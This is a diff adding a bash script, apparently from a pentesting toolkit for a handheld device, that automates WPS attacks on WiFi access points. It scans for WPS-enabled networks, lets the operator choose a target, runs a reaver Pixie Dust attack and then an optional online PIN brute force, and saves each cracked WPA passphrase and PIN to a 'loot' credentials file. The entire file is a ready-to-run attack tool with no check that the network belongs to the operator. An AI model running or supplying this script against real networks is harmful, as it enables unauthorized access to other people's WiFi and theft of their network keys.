@@ -1,0 +1,120 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/wps-attack
+# WPS Pixie Dust + PIN brute-force via reaver/wash
+# Ported from Raspyjack wps_pixie.py (7h30th3r0n3) for ZERO-DAY OS arm64
+#
+# Usage: wps-attack [iface]
+#   iface — WiFi dongle interface capable of monitor mode (default: wlan1)
+#
+# Deps: reaver (provides wash + reaver) — apt install reaver
+
+IFACE="${1:-wlan1}"
+LOOT="/opt/cardputer/loot/wifi"
+CREDS="/opt/cardputer/loot/creds"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+OUTDIR="${LOOT}/wps_${TIMESTAMP}"
+mkdir -p "$OUTDIR" "$CREDS"
+
+RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
+YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
+
+info() { echo -e "${CYAN}[*]${NC} $*"; }
+ok()   { echo -e "${GREEN}[+]${NC} $*"; }
+warn() { echo -e "${YELLOW}[!]${NC} $*"; }
+err()  { echo -e "${RED}[!]${NC} $*"; exit 1; }
+
+[ "$(id -u)" -ne 0 ] && err "Root required."
+command -v wash   &>/dev/null || err "wash not found — apt install reaver"
+command -v reaver &>/dev/null || err "reaver not found — apt install reaver"
+ip link show "$IFACE" &>/dev/null || err "Interface $IFACE not found. Connect RTL8821CU dongle."
+
+echo -e "${BOLD}${CYAN}━━━ WPS ATTACK — ZERO-DAY OS ━━━${NC}"
+info "Interface: $IFACE  Output: $OUTDIR"
+echo ""
+
+# Monitor mode
+info "Setting $IFACE to monitor mode..."
+ip link set "$IFACE" down 2>/dev/null
+iw dev "$IFACE" set type monitor 2>/dev/null \
+    || { airmon-ng start "$IFACE" 2>/dev/null || err "Cannot set monitor mode on $IFACE"; }
+ip link set "$IFACE" up 2>/dev/null
+sleep 1
+
+restore() {
+    ip link set "$IFACE" down 2>/dev/null || true
+    iw dev "$IFACE" set type managed 2>/dev/null || true
+    ip link set "$IFACE" up 2>/dev/null || true
+}
+trap restore EXIT
+
+# Scan for WPS APs
+info "Scanning for WPS-enabled APs (15s)..."
+SCAN="$OUTDIR/wps_scan.txt"
+timeout 15 wash -i "$IFACE" -C 2>/dev/null > "$SCAN" || true
+
+mapfile -t ap_lines < <(grep -E "^([0-9A-Fa-f]{2}:){5}" "$SCAN" 2>/dev/null | head -20)
+[ ${#ap_lines[@]} -eq 0 ] && { warn "No WPS APs found. Try a different location."; exit 0; }
+
+echo -e "\n  ${CYAN}#  BSSID              CH  RSSI  Locked  ESSID${NC}"
+echo "  ─────────────────────────────────────────────"
+declare -A bssids chans locked essids
+n=0
+for line in "${ap_lines[@]}"; do
+    bssid=$(awk '{print $1}' <<< "$line")
+    chan=$(awk  '{print $2}' <<< "$line")
+    rssi=$(awk  '{print $3}' <<< "$line")
+    lock=$(awk  '{print $5}' <<< "$line")
+    essid=$(awk '{$1=$2=$3=$4=$5=""; print $0}' <<< "$line" | xargs)
+    n=$(( n+1 ))
+    bssids[$n]="$bssid"; chans[$n]="$chan"
+    locked[$n]="$lock";  essids[$n]="${essid:-<hidden>}"
+    lf=""; [ "$lock" = "Yes" ] && lf="${RED}LOCKED${NC}" || lf="${GREEN}open${NC}"
+    printf "  ${CYAN}%2d${NC}  %-17s  %2s  %4s  " "$n" "$bssid" "$chan" "$rssi"
+    echo -e "${lf}  $essid"
+done
+
+echo ""
+echo -n "Select target [1-${n}]: "
+read -r sel
+[[ "$sel" =~ ^[0-9]+$ ]] && [ "$sel" -ge 1 ] && [ "$sel" -le "$n" ] \
+    || { err "Invalid selection."; }
+
+BSSID="${bssids[$sel]}"; CHAN="${chans[$sel]}"
+ESSID="${essids[$sel]}"; LOCK="${locked[$sel]:-No}"
+ok "Target: $BSSID  CH:$CHAN  SSID:$ESSID"
+[ "$LOCK" = "Yes" ] && warn "WPS reports locked — Pixie Dust may still work"
+
+# Phase 1: Pixie Dust (offline attack — fast)
+echo ""
+info "Phase 1/2: Pixie Dust (offline, 90s max)..."
+PLOG="$OUTDIR/pixie_${BSSID//:/_}.log"
+timeout 90 reaver -i "$IFACE" -b "$BSSID" -c "$CHAN" -K 1 -v 2>&1 | tee "$PLOG" &
+wait $! 2>/dev/null || true
+
+PSK=$(grep -oE "WPA PSK: '[^']+'" "$PLOG" 2>/dev/null | sed "s/WPA PSK: '//;s/'$//" | head -1)
+PIN=$(grep -oE "WPS PIN: '[0-9]+'" "$PLOG" 2>/dev/null | sed "s/WPS PIN: '//;s/'$//" | head -1)
+
+if [ -n "$PSK" ]; then
+    ok "PIXIE DUST SUCCESS  PIN:$PIN  PSK:$PSK"
+    echo "[$(date)] WPS-PIXIE  BSSID:$BSSID  SSID:$ESSID  PIN:$PIN  PSK:$PSK" >> "$CREDS/wps_creds.txt"
+    exit 0
+fi
+warn "Pixie Dust failed — AP may not be vulnerable"
+
+# Phase 2: Online brute-force (slow — ask first)
+echo ""
+echo -n "Try online PIN brute-force? (very slow, may lock AP) [y/N]: "
+read -r confirm
+[ "${confirm,,}" != "y" ] && { info "Done."; exit 0; }
+
+warn "Online brute-force running. Ctrl+C to abort. Delay: 5s between pins."
+BLOG="$OUTDIR/brute_${BSSID//:/_}.log"
+reaver -i "$IFACE" -b "$BSSID" -c "$CHAN" -v -d 5 -r 3:15 2>&1 | tee "$BLOG"
+
+PSK=$(grep -oE "WPA PSK: '[^']+'" "$BLOG" 2>/dev/null | sed "s/WPA PSK: '//;s/'$//" | head -1)
+[ -n "$PSK" ] && {
+    PIN=$(grep -oE "WPS PIN: '[0-9]+'" "$BLOG" 2>/dev/null | sed "s/WPS PIN: '//;s/'$//" | head -1)
+    ok "CRACKED  PIN:$PIN  PSK:$PSK"
+    echo "[$(date)] WPS-BRUTE  BSSID:$BSSID  SSID:$ESSID  PIN:$PIN  PSK:$PSK" >> "$CREDS/wps_creds.txt"
+} || warn "Not cracked — log: $BLOG"
